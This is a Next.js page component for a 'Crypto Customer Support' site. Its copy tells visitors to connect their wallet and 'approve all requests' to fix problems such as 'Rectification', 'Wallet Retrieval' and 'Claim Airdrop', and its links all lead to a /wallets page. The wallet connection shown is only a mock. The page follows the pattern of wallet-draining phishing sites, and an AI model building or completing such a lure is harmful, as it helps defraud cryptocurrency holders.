import Head from 'next/head'
import { useState } from 'react'
import styles from '../styles/Home.module.scss'

export default function Home() {
  const [modalOpen, setModalOpen] = useState(false)
  const [wallet, setWallet] = useState(null)

  function connectMock() {
    setWallet({address: '0x' + Math.random().toString(16).slice(2, 10)})
    setModalOpen(false)
  }

  return (
    <div className={styles.container}>
      <Head>
        <title>Crypto Customer Support</title>
      </Head>

      <header className={styles.header}>
        <h1>Crypto Customer Support</h1>
        <div>
          {wallet ? (
            <button className={styles.btnSecondary}>{wallet.address}</button>
          ) : (
            <button className={styles.btnPrimary} onClick={() => setModalOpen(true)}>Connect Wallet</button>
          )}
        </div>
      </header>

      <main className={styles.main}>
        <section className={styles.hero}>
          <h2>Open, Secure, and Crypto Protocol for syncing and rectification of various wallet</h2>
          <ol className={styles.steps}>
            <li><strong>Connect your Wallet</strong><span>Choose Automatically or Manually to Connect.</span></li>
            <li><strong>Choose a Feature</strong><span>Select the problem you want to fix instantly.</span></li>
            <li><strong>Confirm & Approve</strong><span>Accept and approve all requests.</span></li>
          </ol>
        </section>

        <section className={styles.features}>
          <h3>Features</h3>
          <div className={styles.featureList}>
            {['Harvest','Withdrawal','Staking Pool','Review My NFT','Restore Token','Update My Portfolio','Purchase Token','Staking Review','Migration Issues','Asset Recovery','Rectification','High Gas Fees','Validate','Slippage Error','Transaction Error','Cross Chain Transfer','Staking Issues','Swap/Exchange','Claim Reflection','Dapps Reconnection','Login Issues','Claim Airdrop','NFTS Issues','Missing/Irregular Balances','Threats Scan','Transaction Delays','Locked Accounts','Trading Wallet Issues','Tokens Purchase','Wallet Whitelist','Wallet Issurance','Wallet Retrieval','Others'].map((f,i)=> (
              <div key={i} className={styles.feature}>{f}</div>
            ))}
          </div>
        </section>

        <section className={styles.links}>
          <h4>Additional Links</h4>
          <ul>
            <li><a href="/wallets">Connect Wallet</a></li>
            <li><a href="/wallets">Claim Airdrop</a></li>
            <li><a href="/wallets">DeFI Market AI Signals</a></li>
          </ul>
        </section>
      </main>

      <footer className={styles.footer}>
        <p>Powered by external price providers. Bitcoin, Ethereum, Tether prices.</p>
      </footer>

      {modalOpen && (
        <div className={styles.modalOverlay} onClick={() => setModalOpen(false)}>
          <div className={styles.modal} onClick={e=>e.stopPropagation()}>
            <h4>Connect Wallet</h4>
            <p>Select a wallet to connect (mock)</p>
            <div className={styles.modalBtns}>
              <button onClick={connectMock} className={styles.btnPrimary}>Connect MetaMask</button>
              <button onClick={connectMock} className={styles.btnSecondary}>Connect WalletConnect</button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
